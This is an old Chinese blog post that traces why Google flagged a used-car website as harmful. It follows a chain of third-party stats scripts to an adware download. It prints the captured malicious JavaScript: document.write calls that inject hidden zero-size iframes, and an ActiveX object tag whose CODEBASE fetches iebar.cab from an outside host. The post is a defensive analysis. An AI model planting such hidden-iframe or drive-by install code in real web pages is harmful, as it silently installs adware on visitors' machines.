---
title: 一段Script引发的“冤案”
date: 2007-04-24 14:59:47 + 0080
category: [Web开发]
tags: [Web, Debugging]
---

用 Google 搜索关键字：西安二手车，发现这个网站的下面多了一段警告。提示：**This site may harm your computer.** 本网站可能危害您的电脑。点击link后google会弹出一个更大的警告让你不去访问这个网站。  
![alert](/assets/attachments/2007/04/24_145646_nkcqimage1.gif)  
看到这个提示，十分佩服 Google。把搜索和查毒集成在一起了。Google的搜索引擎真是牛。可是为什么 Google 会认为这个网站有问题会 **harm your computer**。进入 Google 对此内容的解释：  

> This warning message appears with search results that weve identified as sites that may install malicious software on your computer. We want our users to feel safer when they search the web, and were continuously working to identify such dangerous sites and increase protection for our users.  

看来是这个站点会在用户浏览时安装恶意的程序。  
升级了诺顿，冲入这网站探个究竟。刚一进如后就发现诺顿提示有病毒。  
![risks](/assets/attachments/2007/04/24_145716_b91eimage2.gif)  
看来这个网站真的是有问题。到底这个网站那里出了问题，是站长故意把病毒放在里面了？还是什么问题。进入病毒的描述信息  

```  
Updated: February 13, 2007 11:51:32 AM  
Type: Adware  
Publisher: HDT, Inc  
Risk Impact: High  
File Names: iebar22.0.dll barhelp22.0.dll  
Systems Affected: Windows 2000, Windows 98, Windows Me, Windows NT, Windows Server 2003, Windows XP  
Behavior  
Adware.Iebar is a Browser Helper Object that displays advertisements and downloads files  
Symptoms  
Your Symantec product detects this threat as Adware.Iebar.  
Unexpected advertisements appear in Internet Explorer browser windows.  
```
看来是 `IE` 恶意插件。
用 `http` 请求跟踪工具，看看浏览器请求了什么。
![requests](/assets/attachments/2007/04/24_145800_3zs7image3.gif)  
看到`iebar.t2t2.com /iebar.cab application/octet-stream`。这一行真相大白了。是这个网站加载了这个恶意文件。当用户浏览时要求用户下载。看来Google真厉害，把网站上的这种动作都记录下来并分析了。  

要求用户访问下载这个 `iebar.cab`，Render 过来对应的 html 是什么呢。是用 `iframe src` 请求下载，使用 `image src script src` 是什么样一种方式呢？再次进入跟踪。发现是：  
`iebar.t2t2.com /test1.htm` 这一行 Render 了这样的代码：

```html
<script language=javascript>  
//......   
if (GetCookie("today_install")==null)  
{ 
    document.write("<object id=InitObj classid=clsid:56A7DC70-E102-4408-A34A-AE06FEF01586 height=0 width=0 CODEBASE=http://iebar.t2t2.com/iebar.cab#Version=1,1,0,0></object>");
}  
//......  
</script>
```

其中的:  
`document.write("<object id=InitObj classid=clsid:56A7DC70-E102-4408-A34A-AE06FEF01586 height=0 width=0 CODEBASE=http://iebar.t2t2.com/iebar.cab#Version=1,1,0,0></object>");`  
是“元凶”要求用户下载并安装这个恶意插件。

是谁请求的 `/test1.htm？`  
查看 `stat1.vipstat.com /stat/IEBarInstall_TC.htm?pid=27902&unionid=4&sid=18458&ktime=24 text/html` 这一行，它 Render 了这样的代码：  
```js
if (isinstall==1) {
    SetCookie(cookieKey,pid +"|" + unionid + "|" + sid,1);
    document.write("<iframe width=0 height=0 src=\"http://iebar.t2t2.com/test1.htm\" frameborder=no border=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=yes><\/iframe>");
}
```

是 `document.write("<iframe width=0 height=0 src=\"http://iebar.t2t2.com/test1.htm\" frameborder=no border=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=yes><\/iframe>")` 是Javascript 动态添加的 Iframe带入的恶意脚本。

是谁请求的 `/stat/IEBarInstall_TC.htm?pid=27902&unionid=4&sid=18458&ktime=24`  
查看 `stat.t2t2.com /log/log1.asp?default&user=zgchecom text/html` 这一行，它请求 Render 回来了：
```js  
function GetCookie(sName)  
{  
    var aCookie = document.cookie.split("; "); 
    for (var i=0; i < aCookie.length; i++) 
    {  
        var aCrumb = aCookie[i].split("="); 
        if (sName == aCrumb[0])  
        return unescape(aCrumb[1]); 
    }  
    return null;  
}  

cookieName="comt2t2"; 
isCookie = GetCookie(cookieName);

if ( isCookie != ok)  
{  
    document.write('<iframe width=0 height=0 src="http://stat1.vipstat.com/stat/IEBarInstall_TC.htm?pid=27902&unionid=4&sid=18458&ktime=24" frameborder=no border=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=yes></iframe>');
}
```
又是 Javascript 动态添加的 iframe 带入的恶意脚本。  
是谁请求了`/log/log1.asp?default&user=zgchecom`  
查看 `stat.t2t2.com /stat.js application/x-javascript` 这一行 Render 回来的脚本：   

```js
var tc_user;  
document.write("<a href=http://www.textclick.com/viewmain.asp?name=+tc_user+ target=_blank><img src=http://stat.t2t2.com/stat.gif border=0></a>");  
if (tc_user==null) tc_user="";
document.write('<iframe width=0 height=0 src="http://stat.t2t2.com/log/log1.asp?default&user=+tc_user+" frameborder=no border=0 MARGINWIDTH=0 MARGINHEIGHT=0 SCROLLING=no></iframe>');
```

还是 Javascript 动态添加的 iframe 带入的恶意脚本。  
这几次绕来绕去，都没有看到 w`ww.zgche.com` 我们实际访问的站点。  
在 `http://www.zgche.com/index.asp` Render 回来的 html 终于找到加载 `stat.t2t2.com/stat.js` 的代码：  

```html
<script language="javascript" src="http://count16.51yes.com/click.aspx?id=162936015&logo=8"></script>  
<script>var a="zgchecom";</script>
<script>var tc_user="zgchecom";var tc_class="18";</script>
<script src="http://stat.t2t2.com/stat.js"></script>  
```

终于整个加载的线路清楚了。
```  
http://www.zgche.com/index.asp ->  
http://stat.t2t2.com/stat.js ->  
http://stat.t2t2.com/log/log1.asp?default&user=zgchecom -> http://stat1.vipstat.com/stat/IEBarInstall_TC.htm?pid=27902&unionid=4&sid=18458&ktime=24 ->  
http://iebar.t2t2.com/test1.htm ->  
http://iebar.t2t2.com/iebar.cab  
```

通过上面的加载。恶意的程序最终 Render 成 `<object id=InitObj classid=clsid:56A7DC70-E102-4408-A34A-AE06FEF01586 height=0 width=0 CODEBASE=http://iebar.t2t2.com/iebar.cab#Version=1,1,0,0></object>` 让浏览器来解释。浏览器看到 `object activeX` 要求用户安装。恶意程序通过这个手段安装到用户的机器上了。 

**好曲折的步骤。恶意程序十分会隐藏自己。**  

最终找到恶意程序。但是从上面的分析最初用户访问的`www.zgche.com`并没有 “问题”。不是站长放入了恶意程序。它完全是被“牵连”的。是 `stat1.vipstat.com/stat/IEBarInstall_TC.htm?pid=27902&unionid=4&sid=18458&ktime=24` 加载了恶意成程序。是 `stat1.vipstat.com` 出了问题。但 Google 认为是它出了问题。Google 站在访问者的角度来看待问题。在 Google的 link: `www.stopbadware.org/home/help` 看到 stopbadware 建立了一个数据库，存储这些恶意站点的信息，建立了黑名单。支持申诉。猜想 Google 是分析这个页面的请求，当请求 `http: //iebar.t2t2.com/iebar.cab` 这种在黑名单的地址就认为这个网站是有恶意的网站。最初在建立这个黑名单时，是用这种最终存放恶意程序的地址为源头，来搜索谁请求了他们。然后记录下这些直接请求的地址。然后再看谁请求了这些地址。再次加入黑明单。这样层层的加入来扩张黑名单的数据库。  

**问题的根本原因是一段 Script 的多重加载，加载了恶意程序。** 
